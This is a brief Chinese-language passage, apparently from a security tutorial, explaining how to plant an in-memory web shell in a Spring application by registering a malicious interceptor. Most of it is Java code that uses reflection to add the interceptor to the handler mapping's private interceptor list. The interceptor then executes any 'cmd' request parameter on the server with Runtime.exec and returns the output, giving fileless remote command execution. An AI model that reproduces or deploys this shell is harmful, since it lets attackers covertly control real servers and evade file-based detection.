
防止注入了控制器，但是拦截器有拦截恶意cmd。并且拦截器没有SpringBoot版本问题（可能javax换jakarta）。
则直接注入拦截器
```
过滤器（Filter） → 拦截器1（Interceptor preHandle）→ 拦截器2（Interceptor preHandle） → 控制器（Controller）

过滤器（Filter） ← 拦截器1（Interceptor）← 拦截器2（Interceptor ） ← 控制器（Controller）
```
```
@RestControllerpublic class MyController {    
    @RequestMapping("/hello")    
    public String hello(){  return "hello world"; }
    
    @RequestMapping(value = "/inject/interceptor")
    public String injectInterceptor(){
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.getRequestAttributes().getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE,0);
        RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);
        try {
            Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            List<HandlerInterceptor> list = (List<HandlerInterceptor>) field.get(mapping);
            list.add(new HelloInterceptor());
        } catch (NoSuchFieldException | IllegalAccessException e) {
            throw new RuntimeException(e);
        }
        return "inject interceptor success";
    }
    public class HelloInterceptor implements HandlerInterceptor {
        @Override
        public boolean preHandle(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response, Object handler) throws Exception {
            String cmd = request.getParameter("cmd");
            if (cmd!=null){
                Process proc = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null){
                    response.getWriter().println(line);
                }
                return false;
            }
            return true;
        }
    }
}
```
